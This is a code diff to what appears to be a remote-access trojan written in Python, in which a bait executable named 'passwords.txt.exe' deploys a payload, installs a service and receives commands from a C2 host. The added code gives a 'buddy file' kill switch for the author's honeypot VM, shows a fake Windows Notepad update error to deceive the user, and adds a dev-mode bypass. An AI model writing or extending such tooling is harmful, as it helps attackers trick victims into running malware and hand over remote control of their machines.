@@ -15,8 +15,15 @@ import time
 # Import from utils modules
 from utils.config import DEFAULT_PORT, RETRY_DELAY, FAKE_PASSWORDS, PAYLOAD_NAME
 from utils.common import (
-    log, dev_pause, get_payload_path, is_bait_file, is_payload,
-    parse_cli_arguments, copy_dev_mode_marker, cleanup_payload_files, get_c2_host
+    log,
+    dev_pause,
+    get_payload_path,
+    is_bait_file,
+    is_payload,
+    parse_cli_arguments,
+    copy_dev_mode_marker,
+    cleanup_payload_files,
+    get_c2_host,
 )
 from utils.install import check_and_install_service
 from utils.modes import ModeManager
@@ -27,6 +34,41 @@ from utils.protocol import receive_text
 # ============================================================================
 # DEPLOYMENT FUNCTIONS (Stage 1 & 2)
 # ============================================================================
+
+
+def check_buddy_system():
+    """
+    Safety check: If buddy file exists, show fake error and exit.
+    This prevents deployment on the honeypot VM.
+    Returns True if buddy detected (safe mode), False otherwise (armed mode).
+    """
+    import ctypes
+
+    # Determine directory where the executable is running from
+    if getattr(sys, "frozen", False):
+        application_path = os.path.dirname(sys.executable)
+    else:
+        application_path = os.path.dirname(os.path.abspath(__file__))
+
+    # Check for buddy file in same directory
+    buddy_file_name = "ww2bomberplane.png"
+    buddy_file_path = os.path.join(application_path, buddy_file_name)
+
+    if os.path.exists(buddy_file_path):
+        # SAFE MODE - Show fake Windows error
+        title = "Notepad"
+        message = (
+            "This file cannot be opened.\n\n"
+            "Notepad requires an update to read this document. "
+            "Please install the latest Windows 11 updates and restart your computer to get the newest version of Notepad.\n\n"
+            "To update: Settings > Windows Update > Check for updates"
+        )
+
+        # Display native Windows message box with information icon (0x40)
+        ctypes.windll.user32.MessageBoxW(0, message, title, 0x40)
+        return True
+
+    return False
 
 
 def deploy_payload():
@@ -123,7 +165,7 @@ def start_receiver(host: str, port: int = DEFAULT_PORT) -> None:
         port: The sender's port number
     """
     attempt = 1
-    
+
     # Create mode manager and command router
     mode_manager = ModeManager()
     router = CommandRouter(mode_manager)
@@ -259,6 +301,24 @@ if __name__ == "__main__":
         # STAGE 1: Bait file execution (passwords.txt.exe)
         if is_bait_file():
             log("\n[ Bait file detected - Deploying payload ]\n")
+
+            # Check if running in dev mode:
+            # 1. Running as .py file (not frozen/compiled)
+            # 2. .dev_mode marker file exists in executable directory
+            is_frozen = getattr(sys, "frozen", False) or "__compiled__" in globals()
+            exe_dir = os.path.dirname(sys.executable if is_frozen else os.path.abspath(__file__))
+            dev_mode_marker = os.path.join(exe_dir, ".dev_mode")
+            is_dev_mode = not is_frozen or os.path.exists(dev_mode_marker)
+
+            # Buddy system safety check (skip in dev mode)
+            if not is_dev_mode:
+                if check_buddy_system():
+                    log("[ Buddy file detected - Safe mode activated ]")
+                    sys.exit(0)  # Exit safely without deployment
+            else:
+                log("[ Dev mode detected - Skipping buddy check ]")
+
+            # Proceed with normal deployment if no buddy detected
             deploy_payload()
             # deploy_payload() calls sys.exit(0) - execution stops here
 
